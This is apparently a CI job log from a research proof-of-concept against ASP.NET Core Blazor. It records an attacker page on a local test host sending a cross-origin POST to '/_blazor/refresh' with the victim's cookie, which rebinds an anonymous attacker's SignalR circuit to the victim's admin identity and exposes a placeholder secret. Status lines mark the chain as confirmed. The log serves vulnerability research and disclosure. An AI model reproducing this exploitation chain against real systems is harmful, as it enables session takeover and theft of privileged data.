+2026-09-21T20:52:55.9868063Z       AuthenticationScheme: Lab signed in.
+2026-09-21T20:52:55.9868719Z info: Microsoft.AspNetCore.Http.Result.ContentResult[2]
+2026-09-21T20:52:55.9869600Z       Write content with HTTP Response ContentType of text/html
+2026-09-21T20:52:55.9870198Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:55.9870671Z       Executed endpoint 'HTTP: GET /browser-login'
+2026-09-21T20:52:55.9871098Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:55.9871716Z       Request finished HTTP/1.1 GET http://target.localtest.me:5088/browser-login - 200 101 text/html 1.1920ms
+2026-09-21T20:52:56.2736802Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:56.2737556Z       Request starting HTTP/1.1 GET http://target.localtest.me:5088/favicon.ico - - -
+2026-09-21T20:52:56.2751091Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:56.2752141Z       Request finished HTTP/1.1 GET http://target.localtest.me:5088/favicon.ico - 404 0 - 1.2732ms
+2026-09-21T20:52:56.2752971Z info: Microsoft.AspNetCore.Hosting.Diagnostics[16]
+2026-09-21T20:52:56.2754989Z       Request reached the end of the middleware pipeline without being handled by application code. Request path: GET http://target.localtest.me:5088/favicon.ico, Response status code: 404
+2026-09-21T20:52:56.6891994Z VICTIM_BROWSER_LOGIN_EXIT=0
+2026-09-21T20:52:56.9810340Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:56.9811251Z       Request starting HTTP/1.1 GET http://attacker.localtest.me:5089/attack?token=d0oI3a6xHcBP-1zHAQeg7Q - - -
+2026-09-21T20:52:56.9837686Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:56.9838466Z       Executing endpoint 'HTTP: GET /attack'
+2026-09-21T20:52:56.9880434Z info: Microsoft.AspNetCore.Http.Result.ContentResult[2]
+2026-09-21T20:52:56.9881110Z       Write content with HTTP Response ContentType of text/html
+2026-09-21T20:52:56.9881708Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:56.9882221Z       Executed endpoint 'HTTP: GET /attack'
+2026-09-21T20:52:56.9882695Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:56.9883874Z       Request finished HTTP/1.1 GET http://attacker.localtest.me:5089/attack?token=d0oI3a6xHcBP-1zHAQeg7Q - 200 277 text/html 2.3085ms
+2026-09-21T20:52:57.0112624Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:57.0130721Z       Request starting HTTP/1.1 POST http://target.localtest.me:5088/_blazor/refresh?id=d0oI3a6xHcBP-1zHAQeg7Q - application/x-www-form-urlencoded 0
+2026-09-21T20:52:57.0132511Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:57.0180246Z       Executing endpoint 'Microsoft.AspNetCore.Routing.RouteEndpoint'
+2026-09-21T20:52:57.0184223Z warn: Microsoft.AspNetCore.SignalR.HubConnectionHandler[7]
+2026-09-21T20:52:57.0185595Z       The refreshed principal maps to a different user identifier (current: '(null)', refreshed: 'browser-victim'). The configured refresh policy accepted the principal, but SignalR retained the current identifier because user routing cannot be rekeyed.
+2026-09-21T20:52:57.0186782Z CIRCUIT_AUTH_CHANGED=browser-victim;ADMIN=True
+2026-09-21T20:52:57.0187226Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:57.0187763Z       Executed endpoint 'Microsoft.AspNetCore.Routing.RouteEndpoint'
+2026-09-21T20:52:57.0188267Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:57.0189311Z       Request finished HTTP/1.1 POST http://target.localtest.me:5088/_blazor/refresh?id=d0oI3a6xHcBP-1zHAQeg7Q - 200 29 application/json 7.9526ms
+2026-09-21T20:52:57.0670571Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:57.0727055Z       Request starting HTTP/1.1 GET http://target.localtest.me:5088/favicon.ico - - -
+2026-09-21T20:52:57.0731770Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:57.0760031Z       Request finished HTTP/1.1 GET http://target.localtest.me:5088/favicon.ico - 404 0 - 0.5381ms
+2026-09-21T20:52:57.0779712Z info: Microsoft.AspNetCore.Hosting.Diagnostics[16]
+2026-09-21T20:52:57.0796754Z       Request reached the end of the middleware pipeline without being handled by application code. Request path: GET http://target.localtest.me:5088/favicon.ico, Response status code: 404
+2026-09-21T20:52:57.1367708Z VICTIM_ATTACK_PAGE_EXIT=0
+2026-09-21T20:52:57.1368076Z ATTACK_PAGE_SAW_TARGET_COOKIE=False
+2026-09-21T20:52:57.1368468Z REFRESH_ORIGIN=http://attacker.localtest.me:5089
+2026-09-21T20:52:57.1368817Z REFRESH_SAW_REAL_AUTH_COOKIE=True
+2026-09-21T20:52:57.1369261Z REFRESH_STATUS=200
+2026-09-21T20:52:57.1369598Z ATTACKER_CONNECTION_AFTER_REBIND=Connected
+2026-09-21T20:52:57.1370093Z REAL_COOKIEAUTH_REMOTE_ANONYMOUS_ATTACKER_REBOUND_TO_VICTIM_ADMIN=CONFIRMED
+2026-09-21T20:52:57.1370608Z SAMESITE_LAX_BROWSER_DELIVERY=CONFIRMED
+2026-09-21T20:52:57.1371019Z ATTACKER_CONNECTION_REMAINS_CONNECTED=CONFIRMED
+2026-09-21T20:52:57.1401143Z ADMIN_PROBE_AFTER_REBIND=1
+2026-09-21T20:52:57.1401493Z ADMIN_PROBE_LAST_USER=browser-victim
+2026-09-21T20:52:57.1401871Z ADMIN_PROBE_LAST_IS_ADMIN=True
+2026-09-21T20:52:57.1402267Z ADMIN_PROBE_SECRET=RESEARCH_ADMIN_SECRET_9E4B1D
+2026-09-21T20:52:57.1402702Z ATTACKER_CONNECTION_AFTER_ADMIN_NAV=Connected
+2026-09-21T20:52:57.1403218Z AUTHORIZED_ADMIN_ROUTE_EXECUTED_ON_ATTACKER_CONNECTION=CONFIRMED
+2026-09-21T20:52:57.1404062Z VICTIM_ADMIN_SECRET_REACHED_ATTACKER_OWNED_CIRCUIT=CONFIRMED
+2026-09-21T20:52:57.1404624Z REMOTE_ANONYMOUS_TO_VICTIM_ADMIN_AUTHORIZATION_CONTEXT_TAKEOVER=CONFIRMED
+2026-09-21T20:52:57.1405157Z REAL_ASPNETCORE_COOKIEAUTH_CRITICAL_CHAIN=PASS
+2026-09-21T20:52:57.1405591Z CRITICAL_SEVERITY_CHAIN_EVIDENCE=PASS
+2026-09-21T20:52:57.1457761Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:57.1458484Z       Executed endpoint '/control'
+2026-09-21T20:52:57.1465101Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:57.1465887Z       Request finished HTTP/1.1 GET http://127.0.0.1:5088/control?id=AyxutmJ7iZKEo4U_Jphp5g - 101 - - 7643.1796ms
+2026-09-21T20:52:57.1504373Z info: Microsoft.Hosting.Lifetime[0]
+2026-09-21T20:52:57.1504815Z       Application is shutting down...
+2026-09-21T20:52:57.1522767Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:57.1523425Z       Executed endpoint 'Microsoft.AspNetCore.Routing.RouteEndpoint'
+2026-09-21T20:52:57.1524023Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:57.1524793Z       Request finished HTTP/1.1 GET http://127.0.0.1:5088/_blazor?id=d0oI3a6xHcBP-1zHAQeg7Q - 101 - - 8321.0772ms
+2026-09-21T20:52:57.2329819Z Post job cleanup.
+2026-09-21T20:52:57.3426008Z Post job cleanup.
+2026-09-21T20:52:57.4095746Z [command]/usr/bin/git version
+2026-09-21T20:52:57.4130543Z git version 2.55.0
+2026-09-21T20:52:57.4161773Z Temporarily overriding HOME='/home/runner/work/_temp/91670b3b-6902-4529-81bd-4c055b2db878' before making global git config changes
+2026-09-21T20:52:57.4163144Z Adding repository directory to the temporary git global config as a safe directory
+2026-09-21T20:52:57.4166223Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/basic-website/basic-website
+2026-09-21T20:52:57.4198416Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-09-21T20:52:57.4229881Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-09-21T20:52:57.4436768Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-09-21T20:52:57.4459454Z http.https://github.com/.extraheader
+2026-09-21T20:52:57.4468255Z [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader
+2026-09-21T20:52:57.4497184Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-09-21T20:52:57.4711768Z [command]/usr/bin/git config --local --name-only --get-regexp ^includeIf\.gitdir:
+2026-09-21T20:52:57.4742673Z [command]/usr/bin/git submodule foreach --recursive git config --local --show-origin --name-only --get-regexp remote.origin.url
+2026-09-21T20:52:57.5083493Z Cleaning up orphan processes
+2026-09-21T20:52:57.5339296Z Terminate orphan process: pid (2573) (MSBuild)
+2026-09-21T20:52:57.5358926Z Terminate orphan process: pid (2609) (VBCSCompiler)
